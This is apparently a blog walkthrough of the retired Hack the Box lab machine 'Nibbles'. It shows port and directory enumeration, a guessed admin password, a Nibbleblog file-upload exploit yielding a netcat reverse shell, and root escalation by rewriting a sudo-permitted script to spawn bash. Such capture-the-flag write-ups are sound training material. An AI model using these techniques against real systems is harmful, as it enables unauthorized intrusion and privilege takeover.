---
layout: post
title: Hack the Box - Nibbles
date: 2020-07-22 20:25:22 +0100
description: Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.
img: nibbles.png
fig-caption: Nibbles
categories: HackTheBox
tags: [Easy, Linux, Retired, CVE]
---
## Overview
Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.
## Enumeration
From port enumeration, it's relatively clear that port 80 is the port we should focus on.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/nibbles]
└─$ sudo nmap -p- -T4 10.129.1.135                         
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 20:33 GMT
Nmap scan report for 10.129.1.135
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
```
When we access port 80 in a browser, we are greeted with a "hello world" page. From there I tried to fuzz pages with nothing coming back. However when we viewed the page source we could see a "nibbleblog" directory mentioned. I then ran a fuzzing scan on that directory and found an admin page.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/nibbles]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.1.135/nibbleblog/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.135/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

content                 [Status: 301, Size: 325, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10]
README                  [Status: 200, Size: 4624, Words: 589, Lines: 64]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10]
                        [Status: 200, Size: 2985, Words: 116, Lines: 61]
                        [Status: 200, Size: 2985, Words: 116, Lines: 61]
:: Progress: [220547/220547] :: Job [1/1] :: 2447 req/sec :: Duration: [0:01:37] :: Errors: 0 ::
```
## Foothold
In order to gain access we had to guess the correct login which had nibbles for the password.

When looking for an exploit I found a metasploit module.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/nibbles]
└─$ searchsploit nibbleblog
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                             | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                              | php/remote/38489.rb
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
However it is also fairly simple to do yourself following the steps outlined [here](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html). This resulted in a user shell
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/nibbles]
└─$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.1.135] 58182
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
nibbler
```
## Privilege Escalation
In order to escalate to root I found that I was able to execute a particular script using root through sudo.
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
I could then create that script and add my own command
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#!/bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash -i' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh     
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
```
